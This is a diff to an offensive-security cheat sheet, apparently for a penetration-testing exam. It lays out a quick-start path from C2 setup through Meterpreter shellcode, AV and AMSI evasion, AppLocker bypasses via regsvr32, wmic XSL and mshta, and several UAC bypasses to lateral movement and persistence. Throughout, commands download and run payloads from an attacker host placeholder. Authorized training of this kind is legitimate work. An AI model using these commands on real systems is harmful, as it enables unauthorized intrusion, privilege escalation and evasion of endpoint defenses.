@@ -7,6 +7,42 @@ Legend: `<IP>` = your attacker IP, `<TARGET>` = victim host, `<PORT>` = your C2 
 
 ---
 
+## Quick start — the panic-proof path
+
+Forget the details — just follow this **top-down**, one step at a time. Each step tells
+you **where to go** (section) and **what to run**.
+
+| # | You want to… | Go here |
+|---|---|---|
+| 0 | Set up your C2 | Section 0 — copy-paste one `multi/handler` line |
+| 1 | Learn the target (AppLocker? 32/64-bit?) | Section 1 — recon macro → watch apache2 log |
+| 2 | Create the shellcode | Section 2 — `msfvenom` (staged ~500B vs stageless ~200KB) |
+| 3 | Beat AV on the way in | Section 3 — Caesar → XOR → AES |
+| 4 | Run it in memory | Section 4 — pick a C# runner |
+| 5 | PowerShell keeps getting blocked | Section 5 — AMSI/ETW bypass first |
+| 6 | AppLocker is ON | Section 6 — InstallUtil / msbuild / regsvr32 / SuperSharpShooter |
+| 7 | Need admin | Section 7 — fodhelper UAC bypass |
+| 8 | Move / stay | Section 8 (lateral) · 9 (persist) · 10 (CLM) |
+| 9 | Defender still catches it | Section 11 — NimSyscallPacker |
+
+**Where do I GET each tool?**
+
+| Tool | How to get it |
+|---|---|
+| `msfvenom` / `msfconsole` | pre-installed on Kali (`which msfvenom`) |
+| `apache2` | pre-installed on Kali (`sudo systemctl start apache2`, files → `/var/www/html/`) |
+| `word-macro/`, `cs-loaders/`, `aes-loaders/`, `ps-loaders/`, `applocker/`, `uac-bypass/`, `lateral-movement/` | already in this repo |
+| `NimSyscallPacker` (Section 11, optional) | `git clone https://github.com/S3cur3Th1sSh1t/NimSyscallPacker` → `nimsyscallpacker/README.md` |
+| `SuperSharpShooter` (Section 6, optional) | `git clone https://github.com/ScriptIdiot/SuperSharpShooter` → `supersharpshooter/README.md` |
+
+**If a session doesn't come back, check in this order:**
+1. Handler `LPORT` matches the payload `LPORT`.
+2. Payload arch matches the target (x64 vs x86).
+3. apache2 is actually serving the file — `ls /var/www/html/`.
+4. `jobs -l` shows the handler is running.
+
+---
+
 ## 0. C2 setup (attacker, once)
 
 ```bash
@@ -35,7 +71,8 @@ msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/re
 **Use the recon macro** — phones home with a GET path telling you what to deploy next.
 
 ```bash
-python3 -m http.server 80     # just watch the request path
+sudo systemctl start apache2
+tail -f /var/log/apache2/access.log     # just watch the request path
 ```
 
 1. Edit `word-macro/recon/starter-word-macro.vba`: set `serverURL` to `http://<IP>`.
@@ -70,6 +107,11 @@ Deliver: `mshta.exe http://<IP>/red.hta`
 > `word-macro/installutil-applocker-bypass/installutil.cs`) — **not** a raw Go/Meterpreter implant,
 > because InstallUtil only executes .NET assemblies. `red.hta` runs an in-memory PowerShell
 > `payload.ps1` (no disk write).
+
+### Situation: need an AppLocker-safe payload without PowerShell → SuperSharpShooter
+Use **DotNetToJScript** (JScript/VBScript/HTA load a .NET runner in memory via
+`cscript`/`wscript`/`mshta`) or **squiblytwo** XSL (`wmic`/`regsvr32`). Generate with the
+optional `supersharpshooter/` tool — setup + examples in its `README.md`.
 
 ---
 
@@ -180,12 +222,18 @@ AppLocker blocks user-writable EXEs and PowerShell. Use Microsoft-signed LOLBins
 | Full chain from a macro | InstallUtil | `word-macro/installutil-applocker-bypass/` | WMI → bitsadmin download → `installutil.exe /U` |
 | Have shell, want code exec | msbuild inline task | `applocker/msbuild-shellcode.xml` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild-shellcode.xml` |
 | Have shell, want code exec | regsvr32 scriptlet | `applocker/regsvr32.sct` | `regsvr32.exe /s /n /u /i:http://<IP>/regsvr32.sct scrobj.dll` |
+| Have shell, want code exec (no PowerShell) | DotNetToJScript / squiblytwo | `supersharpshooter/` | `cscript.exe payload.js` or `wmic.exe os get /format:"http://<IP>/payload.xsl"` |
+
+> **SuperSharpShooter** (optional) turns the Section 2 `msfvenom -f raw` shellcode into
+> JScript/VBScript/HTA/macro payloads via DotNetToJScript, plus squiblytwo XSL for
+> `wmic`/`regsvr32`. Setup + examples: `supersharpshooter/README.md`.
 
 InstallUtil chain (from the macro):
 
 ```bash
 # host three files
-python3 -m http.server 80   # serves InstallUtil.exe, amsi.txt, run.txt
+sudo systemctl start apache2
+sudo cp InstallUtil.exe amsi.txt run.txt /var/www/html/
 ```
 
 ```powershell
@@ -200,7 +248,10 @@ csc /target:exe /platform:x64 /optimize+ /out:InstallUtil.exe installutil.cs `
 
 | Situation | Tool | Command |
 |---|---|---|
-| Have a shell, need admin | fodhelper UAC bypass | `uac-bypass/uac-bypass.ps1` |
+| Have a shell, need admin | fodhelper UAC bypass (`DelegateExecute`) | `uac-bypass/uac-bypass.ps1` |
+| Newer Win10/11 (DelegateExecute patched) | fodhelper **CurVer** UAC bypass | `uac-bypass/uac-bypass-curver.ps1` |
+| `cmstp.exe` available | CMSTP UAC bypass | `uac-bypass/cmstp.ps1` → `Bypass-UAC -Command "<cmd>"` |
+| `eventvwr.exe` available | EventViewer UAC bypass | `uac-bypass/invoke-eventviewer.ps1` → `Invoke-EventViewer <cmd>` |
 
 ```powershell
 # Set the elevated payload in uac-bypass.ps1, then:
@@ -215,6 +266,9 @@ IEX (New-Object Net.WebClient).DownloadString('http://<IP>/uac-bypass.ps1')
 |---|---|---|---|
 | WinRM enabled / admin creds | PSRemoting | `lateral-movement/winrm-psremoting.ps1` | `.\\winrm-psremoting.ps1 -Computer <TARGET> -Credential $cred -StagerUrl http://<IP>/run.ps1` |
 | Admin creds, WMI reachable | WMI `Win32_Process` | `lateral-movement/wmi-exec.ps1` | `.\\wmi-exec.ps1 -Computer <TARGET> -Credential $cred -StagerUrl http://<IP>/run.ps1` |
+| Admin over SMB (no WinRM/WMI) | SMB named-pipe (fileless) | `lateral-movement/invoke-smbremoting.ps1` | `Invoke-SMBRemoting -ComputerName <TARGET>` / `-Command "<cmd>"` |
+| Admin creds, service control | Service hijack (PsExec-style) | `lateral-movement/psexec-lat.cs` | compile → `PsExecLat.exe <TARGET> <payload>` |
+| `sa` on MSSQL + CLR enabled | MSSQL CLR assembly | `lateral-movement/mssql-clr/` | `CREATE ASSEMBLY` → `cmd_exec 'whoami'` |
 
 ```powershell
 # Interactive remote shell (instead of a script):
@@ -277,7 +331,7 @@ deprecated/unmaintained — test on a lab VM before exam day.
 2. **Generate** → `msfvenom -p windows/x64/meterpreter[_]reverse_tcp LHOST=<IP> LPORT=8888 -f <raw|csharp|ps1|vba|exe>`; make arrays/stagers with `-f <format>`.
 3. **Obfuscate** → Caesar < XOR < AES as AV pressure rises.
 4. **Execute** → self-inject → remote-inject → hollowing → Nt* → APC → DInvoke → unhook, as EDR pressure rises.
-5. **AppLocker** → InstallUtil / msbuild / regsvr32. **PowerShell** → AMSI/ETW first.
+5. **AppLocker** → InstallUtil / msbuild / regsvr32 / SuperSharpShooter (DotNetToJScript, squiblytwo). **PowerShell** → AMSI/ETW first.
 6. **Elevate** → fodhelper. **Move** → WinRM/WMI. **Persist** → Run key / task / WMI event.
 7. **Defender still wins** → NimSyscallPacker.
 
